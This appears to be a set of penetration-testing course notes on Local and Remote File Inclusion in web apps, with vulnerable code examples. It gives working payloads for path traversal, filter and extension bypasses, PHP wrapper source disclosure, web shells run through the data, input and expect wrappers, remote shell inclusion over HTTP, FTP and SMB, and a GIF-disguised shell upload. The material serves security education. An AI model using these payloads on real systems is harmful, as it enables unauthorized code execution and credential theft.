# Introduction
## Intro to File Inclusion
Many modern back-end languages, such as `PHP`, `Javascript`, or `Java`, use **HTTP parameters** to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code.

In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a [Local File Inclusion (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability.
## Local File Inclusion (LFI)
The most common place we usually find LFI within is **templating engines**. 
To keep most of the web app looking the same when navigating between pages, a **templating engine** displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages.

Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. **header**/**footer**), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php`. As we have control over the `about` portion of the request, it may be possible to have the web application grab other files and display them on the page.

LFI vulnerabilities can lead to:
* Source Code Disclosure, 
* Sensitive Data Exposure, and 
* Remote Code Execution under certain conditions. 
## Examples of Vulnerable Code
File Inclusion vulnerabilities can occur in many of the most popular  frameworks, like `PHP`, `NodeJS`, `Java`, `.Net`, and many others. Each of them  share one common thing: **loading a file from a specified path**.

Such a file could be a dynamic header or different content based on the user-specified language. For example, the page may have a `?language` **GET** parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different `language` parameter (e.g. `?language=es`). 

In such cases, changing the language may change the directory the web app is loading the pages from (e.g. `/en/` or `/es/`). If we have control over the path being loaded, then we may be able to read other files and potentially reach **RCE**.
#### PHP
In **PHP**, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and **the code does not explicitly filter and sanitize the user input**, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
We see that the "`language`" parameter is directly passed to the `include()` function. So, any path we pass in the "`language`" parameter will be loaded on the page, **including any local files** on the back-end server. 
>[!Note]
This is not exclusive to the `include()` function, as there are many other PHP functions that would lead to the same vulnerability if we had control over the path passed into them. Such functions include `include_once()`, `require()`, `require_once()`, `file_get_contents()`, and several others as well.
### NodeJS
NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a **GET** parameter "`language`" is used to control what data is written to a page:
```js
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
As we can see, whatever parameter passed from the URL gets used by the `readfile` function, which then writes the file content in the HTTP response.

Another example is the `render()` function in the `Express.js` framework. The following example shows how the "`language`" parameter is used to determine which directory to pull the "`about.html`" page from:
```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
Unlike our earlier examples where **GET** parameters were specified after a (`?`) character in the URL, the above example takes the parameter from the URL path (e.g. `/about/en` or `/about/es`). As the parameter is directly used within the `render()` function to specify the rendered file, we can change the URL to show a different file instead.
### Java
The following examples show how web apps for a Java web server may include local files based on the specified parameter, using the `include` function:
```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```
The `include` function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. 

The `import` function may also be used to render a local file or a URL, such as the following example:
```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```
#### .NET
The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a **GET** parameter for dynamic content loading, as follows:
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template:
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well:
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```
## Read vs Execute
The most important thing to keep in mind is that **some of the above functions only read the content of the specified files, while others also execute the specified files**. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server.

The following table shows which functions may execute files and which only read file content:
![[Pasted image 20250206224257.png]]This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the source code without code execution. 

In all cases, File Inclusion vulnerabilities are critical and may eventually lead to compromising the entire back-end server. Even if we were only able to read the web application source code.
# File Disclosure
## Local File Inclusion (LFI)
### Basic LFI
This exercise shows us an example of a web app that allows users to set their language to either  English or Spanish:
![[Pasted image 20250207002702.png]]
If we select a language by clicking on it (e.g. "**Spanish**"), we see that the content text changes to Spanish: 
![[Pasted image 20250207002807.png]]
We also notice that the URL includes a "`?language`" parameter that is now set to the language we selected (`es.php`). There are several ways the content could be changed to match the language we specified. It may be pulling the content from a different database table based on the specified parameter, or it may be loading an entirely different version of the web app. However, loading part of the page using template engines is the easiest and most common method utilized.

So, if the web app is indeed pulling a file that is now being included in the page, we may be able to change the file being pulled to read the content of a different local file. Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows. So, let's change the parameter from "`es`" to "`/etc/passwd`":
![[Pasted image 20250207131253.png]]
As we see, the page is vulnerable, and we're able to read the content of the "`/etc/passwd`" file and identify what users exist on the back-end server.
### Path Traversal
In the earlier example, we read a file by specifying its **absolute path** (e.g. "`/etc/passwd`"). This would work if the whole input was used within the `include()` function without any additions, like the following:
```php
include($_GET['language']);
```
In this case, if we try to read "`/etc/passwd`", then the `include()` function would fetch that file directly. 

However, in many occasions, web developers may append or prepend a string to the `?language` parameter:
```php
include("./languages/" . $_GET['language']);
```
Here, if we attempt to read "`/etc/passwd`", then the path passed to `include()` would be ("`./languages//etc/passwd`"), and this file does not exist:
![[Pasted image 20250207131533.png]]
We can easily bypass this restriction if we can add "`../`" before our file name, which refers to the parent directory. 

So, we can use this trick to go back several directories until we reach the root path (i.e. "`/`"), and then specify our absolute file path (e.g. "`../../../../etc/passwd`"):
![[Pasted image 20250207131559.png]]Even if we were at the root path (`/`) and used `../` then we would still remain in the root path. So, if we were not sure of the directory the web app is in, we can add `../` many times, and it should not break the path (even if we do it a hundred times!).
### Filename Prefix
On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:
```php
include("lang_" . $_GET['language']);
```

In this case, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid:
![[Pasted image 20250207131930.png]]As expected, the error tells us that this file does not exist. 

So, instead of directly using path traversal, we can prefix a "`/`" before our payload, and this should consider the prefix as a directory, and then bypass the filename and be able to traverse directories:
![[Pasted image 20250207132109.png]]
>[!Note]
This may not always work, as in this example a directory named `lang_/` may not exist, so our relative path may not be correct. Furthermore, **any prefix appended to our input may break some file inclusion techniques** we will discuss in upcoming sections, like using PHP wrappers and filters or RFI.
### Appended Extensions
Another very common example is when an extension is appended to the "`?language`" parameter, as follows:
```php
include($_GET['language'] . ".php");
```
This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. 

In this case, if we try to read "`/etc/passwd`", then the file included would be "`/etc/passwd.php`", which does not exist:
![[Pasted image 20250207132324.png]]There are several techniques that we can use to bypass this, and we will discuss them later
### Second-Order Attacks
Another common LFI attack is a **Second Order Attack**. This occurs because many web app functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

For example, a web app may allow us to download our avatar through a URL like ("`/profile/$username/avatar.png`"). If we craft a malicious LFI username (e.g. "`../../../etc/passwd`"), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case:
1. We would be poisoning a database entry with a malicious LFI payload in our username. 
2. Then, another web app functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). 

This is why this attack is called a **Second-Order** attack.

Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a "`?page`" parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.

In this attack the only variance from a normal LFI is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.
## Basic Bypasses
### Non-Recursive Path Traversal Filters
One of the most basic filters against LFI is a **search and replace filter**, where it simply deletes substrings of (`../`) to avoid path traversals. For example:
```php
$language = str_replace('../', '', $_GET['language']);
```
The above code is supposed to prevent path traversal, and hence renders LFI useless. 

If we try the LFI payloads we tried in the previous section, we get the following:
![[Pasted image 20250207133526.png]]
We see that all "`../`" substrings were removed, which resulted in a final path being "`./languages/etc/passwd`". 

However, this filter is very insecure, as it is not **recursively removing** the "`../`" substring, as it runs a single time on the input string and does not apply the filter on the output string. 

For example, if we use "`....//`" as our payload, then the filter would remove "`../`" and the output string would be "`../`", which means we may still perform path traversal. Let's try applying this logic to include "`/etc/passwd`" again:
![[Pasted image 20250207133538.png]]
As we can see, we're able to read "`/etc/passwd`" successfully. The "`....//`" substring is not the only bypass we can use, as we may use "`..././`" or "`....\/`" and several other payloads. 

Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. "`....\/`"), or adding extra forward slashes (e.g. "`....////`")
### Encoding
Some web filters may prevent input filters that include certain LFI-related characters, like a dot (`.`) or a slash (`/`) used for path traversals. 

However, some of these filters may be bypassed by **URL encoding** our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function. 

If the target web app did not allow "`.`" and "`/`" in our input, we can URL encode "`../`" into "`%2e%2e%2f`", which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool, as follows:
![[Pasted image 20250207133620.png]]
>[!Important]
For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

Let's try to use this encoded LFI payload against our earlier vulnerable web application that filters "`../`" strings:
![[Pasted image 20250207133632.png]]
As we can see, we were also able to successfully bypass the filter and use path traversal to read "`/etc/passwd`". Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a **double encoded** string, which may also bypass other types of filters.
### Appended Extension
Some web apps append an extension to our input string (e.g. "`.php`"), to ensure that the file we include is in the expected extension. 

With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful (e.g. for reading source code).

There are a couple of other techniques we may use, but they are **obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4**. However, it may still be beneficial to mention them, as some web apps may still be running on older servers, and these techniques may be the only bypasses possible.
#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of **4096** characters, likely due to the limitation of 32-bit systems. 

If a longer string is passed, it will simply be **truncated**, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call ("`/etc/passwd/.`") then the "`/.`" would also be truncated, and PHP would call ("`/etc/passwd`"). 

PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. "`////etc/passwd`" is the same as "`/etc/passwd`"). Similarly, a current directory shortcut ("`.`") in the middle of the path would also be disregarded (e.g. "`/etc/./passwd`").

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be **truncated**, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to **start the path with a non-existing directory** for this technique to work.

An example of such payload would be the following:
```URL
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
Of course, we don't have to manually type "`./`" 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:
```bash
$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
We may also increase the count of "`../`", as adding more would still land us in the **root** directory, as explained in the previous section. 

However, if we use this method, we should calculate the full length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string ("`/etc/passwd`"). This is why it would be easier to use the first method.
#### Null Bytes
PHP versions before **5.5** were vulnerable to **null byte injection**, which means that adding a null byte ("`%00`") at the end of the string would terminate the string and not consider anything after it. 

This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. "`/etc/passwd%00`"), such that the final path passed to `include()` would be ("`/etc/passwd%00.php`"). This way, even though "`.php`" is appended to our string, anything after the null byte would be truncated, and so the path used would actually be "`/etc/passwd`", leading us to bypass the appended extension.
## PHP Filters
 If we identify an LFI vulnerability in PHP web apps, we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation.

PHP Wrappers allow us to access different **I/O streams** at the application level, like standard input/output, file descriptors, and memory streams. This has a lot of uses for PHP developers. Still, as attackers, we can utilize these wrappers to extend our exploitation attacks and be able to read PHP source code files or even execute system commands. 
### Input Filters
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. 

To use PHP wrapper streams, we can use the "`php://`" scheme in our string, and we can access the PHP filter wrapper with "`php://filter/`".

The `filter` wrapper has several parameters, but the main ones we require for our attack are "`resource`" and "`read`". 
* The "`resource`" parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), 
* The "`read`" parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the "**convert.base64-encode**" filter, under "`Conversion Filters`".
### Fuzzing for PHP Files
The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`:
```bash
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```
>[!Important]
Unlike normal web apps usage, we are not restricted to pages with HTTP response code ``200``, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

Even after reading the sources of any identified files, we can **scan them for other referenced PHP files**, and then read those as well, until we are able to capture most of the web app's source or have an accurate image of what it does. 
### Standard PHP Inclusion
Previously, if we tried to include any PHP files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page. 

For example, let's try to include the `config.php` page (`.php` extension appended by web app):
![[Pasted image 20250207141346.png]]
As we can see, we get an empty result in place of our LFI string, since the "`config.php`" most likely only sets up the web app configuration and does not render any HTML output.

This may be useful in certain cases, like accessing local PHP pages we do not have access over (i.e. [[GitRepo/Bug Bounty Path/Server-Side Attacks/Server-Side Attacks - All in One#Server-Side Request Forgery (SSRF)|SSRF]]), but in most cases, we would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web app. 

This is where the "`base64`" PHP filter gets useful, as we can use it to **base64 encode** the PHP file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only.
### Source Code Disclosure
Let's try to read the source code of "`config.php`" using the Base64 filter, by specifying "`convert.base64-encode`" for the "`read`" parameter and "`config`" for the "`resource`" parameter, as follows:
```url
php://filter/read=convert.base64-encode/resource=config
```
![[Pasted image 20250207141652.png]]
>[!Note]
We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.

As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of `config.php`, as follows:
```bash
$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```
We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.
# Remote Code Execution (RCE)
## PHP Wrappers
We can use many methods to execute remote commands, each of which has a specific use case. One common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server. 

For example, we may find the database password in a file like "`config.php`", which may match a user's password in case they re-use the same password. Or we can check the "`.ssh`" directory in each user's **home** directory, and if the read privileges are not set properly, then we may be able to grab their private key ("`id_rsa`") and use it to SSH into the system.

Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. 
### Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the ("`allow_url_include`") setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.
#### Checking PHP Configurations
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. 

We will also use the `base64` filter we used in the previous section, as "`.ini`" files are similar to "`.php`" files and should be encoded to avoid breaking. Finally, we'll use ``curl`` or ``Burp`` instead of a browser, as the output string could be very long and we should be able to properly capture it:
```bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it and `grep` for "`allow_url_include`" to see its value:
```bash
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
Excellent! We see that we have this option enabled, so we can use the `data` wrapper. Knowing how to check for the "`allow_url_include`" option can be very important, as **this option is not enabled by default**, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack. 

It is not uncommon to see this option enabled, as many web apps rely on it to function properly, like some WordPress plugins and themes.
#### Remote Code Execution
With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Now, we can **URL encode** the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
![[Pasted image 20250207142450.png]]

We may also use ``curl`` for the same attack, as follows:
```bash
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Input
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a **POST** request's data. So, the vulnerable parameter must accept **POST** requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting.

To repeat our earlier attack but with the `input` wrapper, we can send a **POST** request to the vulnerable URL and add our web shell as **POST** data. To execute a command, we would pass it as a **GET** parameter, as we did in our previous attack:
```bash
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
>[!Note]
To pass our command as a **GET** request, we need the vulnerable function to also accept **GET** request (i.e. use `$_REQUEST`). If it only accepts **POST** requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
### Expect
Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. 

We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:
```bash
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```
As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. 

To use the expect module, we can use the "`expect://`" wrapper and then pass the command we want to execute, as follows:
```bash
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
As we can see, executing commands through the `expect` module is fairly straightforward. 

We'll also cover the `phar` and `zip` wrappers later, which we may use with web apps that allow file uploads to gain remote execution through LFI vulnerabilities.
## Remote File Inclusion (RFI)
In some cases, we may be able to read remote files ([Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)), if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
1. Enumerating local-only ports and web apps (i.e. SSRF)
2. Gaining RCE by including a malicious script that we host
### Local vs. Remote File Inclusion
When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain RCE.

If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow **RFI**:

| Function                     | Read Content | Execute | Remote URL |
| ---------------------------- | :----------: | :-----: | :--------: |
| **PHP**                      |              |         |            |
| `include()`/`include_once()` |      ✅       |    ✅    |     ✅      |
| `file_get_contents()`        |      ✅       |    ❌    |     ✅      |
| **Java**                     |              |         |            |
| `import`                     |      ✅       |    ✅    |     ✅      |
| **.NET**                     |              |         |            |
| `@Html.RemotePartial()`      |      ✅       |    ❌    |     ✅      |
| `include`                    |      ✅       |    ✅    |     ✅      |

As we can see, almost any **RFI** vulnerability is also an **LFI** vulnerability, as any function that allows including remote URLs usually also allows including local ones. 

However, **an LFI may not necessarily be an RFI**. This is primarily because of three reasons:
1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent **RFI** altogether, as most modern web servers disable including remote files by default.

Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to enumerate local ports and web apps through SSRF.
### Verify RFI
In most languages, including remote URLs is considered as a dangerous practice. This is why remote URL inclusion is usually disabled by default. 

For example, any remote URL inclusion in PHP would require the "`allow_url_include`" setting to be enabled:
```bash
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. 

So, a more reliable way to determine **whether an LFI vulnerability is also vulnerable to RFI** is to **try and include a URL**, and see if we can get its content. **At first, we should always start by trying to include a local URL** to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:
![[Pasted image 20250207212558.png]]
As we can see, the `index.php` page got included in the vulnerable section (i.e. _History Description_), so the page is indeed vulnerable to RFI, as we are able to include URLs. 

Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

We also see that we were able to specify **port 80** and get the web app on that port. If the back-end server hosted any other local web apps (e.g. **port 8080**), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

>[!Note]
It may not be ideal to include the vulnerable page itself (i.e. ``index.php``), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
### RCE with RFI
The first step in gaining remote code execution is creating a malicious script in the language of the web app, which is PHP in this case. 

We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, all we need to do is host this script and include it through the **RFI** vulnerability. It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted in case the vulnerable web app has a firewall preventing outgoing connections. Furthermore, we may host the script through an ``FTP`` service or an ``SMB`` service, as we will see next.
#### HTTP
Now, we can start a server on our machine:
```bash
$ sudo python3 -m http.server <LISTENING_PORT>

Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Then, we can include our local shell through **RFI**, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id`:
![[Pasted image 20250207212944.png]]
As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
```bash
$ sudo python3 -m http.server <LISTENING_PORT>

Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```
#### FTP
As mentioned earlier, we may also host our script through the ``FTP`` protocol. We can start a basic ``FTP`` server with Python's "`pyftpdlib`", as follows:
```bash
$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```
This may also be useful in case HTTP ports are blocked by a firewall or the "`http://`" string gets blocked by a **WAF**. 

To include our script, we can repeat what we did earlier, but use the "`ftp://`" scheme in the URL, as follows:
![[Pasted image 20250207213123.png]]
As we can see, this worked very similarly to our HTTP attack, and the command was executed. 

**Note**, that by default, PHP tries to authenticate as an ``anonymous`` user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
```bash
$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'

...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### SMB
If the web app is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the "`allow_url_include`" setting to be enabled for **RFI** exploitation. This is because Windows treats files on remote ``SMB`` servers as normal files, which can be referenced directly with a **UNC** path.

We can spin up an ``SMB`` server using "`Impacket's smbserver.py`", which allows anonymous authentication by default, as follows:
```bash
$ impacket-smbserver -smb2support share $(pwd)

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Now, we can include our script by using a **UNC** path (e.g. "`\\<OUR_IP>\share\shell.php`"), and specify the command with ("`&cmd=whoami`") as we did earlier:
![[Pasted image 20250207213402.png]]
As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. 

However, we must note that **this technique is more likely to work if we're on the same network**, as accessing remote ``SMB`` servers over the internet may be disabled by default.
## LFI and File Uploads
The attack we are going to discuss here, does not require the file upload form to be vulnerable, but merely allow us to upload files. 

If the vulnerable function has code "`Execute`" capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. 

For example, we can upload an image file (e.g. "`image.jpg`"), and store a PHP web shell code within it 'instead of image data', and if we include it through the **LFI** vulnerability, the PHP code will get executed and we will have **RCE**.

As mentioned in the first section, in the table below, there are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

### Image upload
Uploading images is widely regarded as safe if the upload function is securely coded. However, the vulnerability is not in the file upload form but the file inclusion functionality.
#### Crafting Malicious Image
Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. 

So, we will use an allowed image extension in our file name (e.g. "`shell.gif`"), and should also include the image magic bytes at the beginning of the file content (e.g. "`GIF8`"), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
```bash
kebamit@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web apps in the slightest. However, if we combine it with an **LFI** vulnerability, then we may be able to reach RCE.

>[!Note]
We are using a `GIF` image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. 

Now, we need to upload our malicious image file. To do so, we can go to the "`Profile Settings`" page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:
![[Pasted image 20250207213526.png]]
#### Uploaded File Path
Once we've uploaded our file, all we need to do is include it through the **LFI** vulnerability. To include the uploaded file, we need to know the path to our uploaded file. 

In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

>[!Note]
